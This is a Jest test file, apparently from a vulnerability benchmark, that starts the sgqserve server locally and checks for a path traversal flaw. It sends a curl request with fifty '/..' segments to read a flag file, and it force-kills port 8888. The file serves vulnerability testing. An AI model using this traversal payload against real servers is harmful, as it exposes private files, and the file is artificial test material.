const v24 = require('child_process');
var execSync = v24.execSync;
const v26 = () => {
    try {
        const v25 = execSync('fuser -k 8888/tcp');
        v25;
    } catch (e) {
    }
};
const v27 = afterAll(v26);
v27;
const path = require('path');
const v28 = require('sleep');
const sleep = v28.sleep;
const pathToFlag = path.resolve(__dirname, '../flag.html');
const genstr = function (n) {
    const v29 = '/..'.repeat(50);
    const v30 = v29 + pathToFlag;
    return v30;
};
const v45 = done => {
    const v31 = expect.assertions(1);
    v31;
    const fs = require('fs');
    const sleep = require('sleep');
    const v32 = require('child_process');
    const exec = v32.exec;
    const v33 = fs.readFileSync(pathToFlag);
    let hostsFile = v33.toString();
    const a = require('child_process');
    try {
        const v34 = () => {
        };
        const v35 = a.execSync('fuser -k 8888/tcp', v34);
        v35;
    } catch (e) {
    }
    let server = 'node ./node_modules/sgqserve/index.js';
    const v36 = (error, stdout) => {
    };
    let exe = exec(server, v36);
    const v37 = sleep.sleep(2);
    v37;
    const v38 = genstr();
    let attack_string = `curl -v --path-as-is "http://127.0.0.1:8888${ v38 }"`;
    const v43 = (error, stdout) => {
        let out = false;
        const v39 = stdout.includes(hostsFile);
        if (v39) {
            out = true;
        }
        const v40 = expect(out);
        const v41 = v40.toBe(true);
        v41;
        const v42 = done();
        v42;
    };
    const v44 = exec(attack_string, v43);
    v44;
};
const v46 = test('Path Traversal in sgqserve', v45);
v46;